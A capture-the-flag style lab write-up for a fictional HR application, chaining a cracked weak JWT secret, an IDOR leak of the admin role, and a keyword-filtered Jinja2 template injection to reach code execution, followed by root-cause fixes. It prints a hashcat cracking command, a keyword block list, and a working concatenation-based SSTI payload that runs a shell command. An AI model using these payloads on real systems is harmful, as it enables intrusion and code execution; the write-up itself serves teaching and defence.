# NimbusHR — JWT Forge → IDOR → Filtered SSTI (full chain to RCE)

| | |
|---|---|
| **Vulnerabilities** | Weak JWT secret · IDOR / BOLA · filtered server-side template injection |
| **Impact** | Remote code execution from a low-privilege account |
| **Difficulty** | ★★★★ |
| **Approach** | Black-box, low-priv credentials given |

## The application

NimbusHR is an HR SaaS. You start as a normal employee (`alice:Password123`). Admin-only features
include a report renderer. The goal is to chain three separate flaws from that low-priv account into
remote code execution and read `/flag.txt`.

```bash
docker compose up -d        # http://localhost:9002
```

## Stage 1 — Forge a JWT (weak HMAC secret)

The session token is a JWT signed with HS256. Switching the algorithm to `none` is rejected, so the
only way forward is to recover the signing secret. The secret (`chocolate`) is a dictionary word, so
it cracks offline against a wordlist:

```bash
hashcat -m 16500 token.jwt rockyou.txt      # recovers: chocolate
```

With the secret, I can mint arbitrary tokens — but simply forging `role: admin` does **not** work
(the app checks a different role value). I need to learn what role actually grants admin.

## Stage 2 — IDOR to leak the privileged role

The user endpoint has no object-level authorization — any authenticated user can read any user id:

```
GET /api/users/1        → {"id":1, "role":"hr_admin", ...}
```

So the real admin role string is **`hr_admin`**, not `admin`. I forge a token with the cracked
secret and `role: hr_admin`, which unlocks the admin report renderer.

## Stage 3 — Filtered SSTI → RCE

The report renderer passes a user-controlled `template` straight into Jinja2
(`render_template_string`). A WAF blocks the obvious RCE keywords **in the template parameter**
(`os`, `popen`, `system`, `subprocess`, `import`, `eval`, `exec`, `globals`, …).

The bypass: Jinja's `~` operator concatenates strings, so I split every blocked keyword — no forbidden
substring ever appears literally in the payload:

```jinja2
{{ (lipsum|attr("__glob"~"als__"))["o"~"s"]["po"~"pen"]("cat /flag.txt").read() }}
```

`"__glob"~"als__"` rebuilds `__globals__`, `"o"~"s"` rebuilds `os`, `"po"~"pen"` rebuilds `popen` —
each dodges the blacklist while Jinja reassembles them at render time.

```
FLAG{jwt_1dor_filt3r3d_sst1_full_ch41n_pwn}
```

## Root-cause fixes

- **JWT:** use a long, random, high-entropy secret from the environment (not a dictionary word);
  keep algorithm pinning; add `exp`/`iat` and validate claims server-side.
- **IDOR:** enforce object-level authorization — a user may read only their own record (or must hold
  an admin role), checked on the server for every id.
- **SSTI:** the blacklist is the bug, not the cure — a determined attacker always reassembles the
  keyword. Remove user-controlled templates entirely, or render them in a `SandboxedEnvironment`, and
  pass data as **context variables** rather than as template source.

## Key lesson

The three bugs are individually mid-severity; chained, they are RCE. Note the SSTI fix: don't
blacklist the dangerous keywords — **remove the dangerous mechanism** (arbitrary templating). The
same string-concatenation trick that beat the WAF here is exactly why blacklists fail.
